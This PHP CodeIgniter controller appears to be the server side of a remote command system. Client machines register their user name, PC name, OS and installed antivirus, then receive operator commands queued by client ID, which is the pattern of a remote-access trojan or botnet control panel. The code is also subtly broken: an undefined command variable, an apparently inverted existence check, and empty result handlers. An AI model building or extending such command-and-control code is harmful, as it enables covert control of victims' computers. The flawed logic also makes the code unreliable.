<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Core_rcs extends CI_Controller {

	/**
	 * Index Page for this controller.
	 *
	 * Maps to the following URL
	 * 		http://example.com/index.php/welcome
	 *	- or -
	 * 		http://example.com/index.php/welcome/index
	 *	- or -
	 * Since this controller is set as the default controller in
	 * config/routes.php, it's displayed at http://example.com/
	 *
	 * So any other public methods not prefixed with an underscore will
	 * map to /index.php/welcome/<method_name>
	 * @see https://codeigniter.com/user_guide/general/urls.html
	 */
	public function index() {
		$this->load->view('api_message');
	}

	public function authentication($secrete = '') {
		if ($this->Funcs->do_authenticated($secrete)) {
			$this->Funcs->json_result('success', 'authentication');
			return true;
		} else {
			$this->Funcs->json_result('error', 'authentication');
			return false;
		}
	}

	public function new_client($cid = '', $user_name = '', $pc_name = '', $os_description = '', $av_name = '', $version = '') {
		if ($cid) {
			if ($this->Database->clients_exists($cid)) {
				if ($this->Database->clients_insert($cid, $user_name, $pc_name, $os_description, $av_name, $version)) {
					$this->Funcs->json_result('success', 'new client insert');
					return true;
				}
			} else {
				if ($this->Database->clients_update($cid, $user_name, $pc_name, $os_description, $av_name, $version)) {
					$this->Funcs->json_result('success', 'new client update');
					return true;
				}
			}
		} else {
			$this->Funcs->json_result('error', 'client id missing');
			return false;
		}
	}

	public function push_command($cid = '') {
		if ($cid) {
			if ($this->Database->clients_push_command($cid, $cmd_data)) {
				$this->Funcs->json_result('success', 'push command');
				return true;
			} else {
				$this->Funcs->json_result('error', 'push command');
				return false;
			}
		} else {
			$this->Funcs->json_result('error', 'client id missing');
			return false;
		}
	}

	public function pop_command($cid = '', $seen = '') {
		if ($cid) {
			if ($this->Funcs->is_authenticated()) {
				$command = $this->Database->clients_pop_command($cid, $seen == 'true');
				if ($command) {
					return $command;
				} else {
					$this->Funcs->json_result('error', 'pop command');
					return false;
				}
			} else {
				$this->Funcs->json_result('error', 'function protected');
				return false;
			}
		} else {
			$this->Funcs->json_result('error', 'client id missing');
			return false;
		}

	}

	public function push_result($cid = '') {

	}

	public function pop_result($cid = '') {

	}

}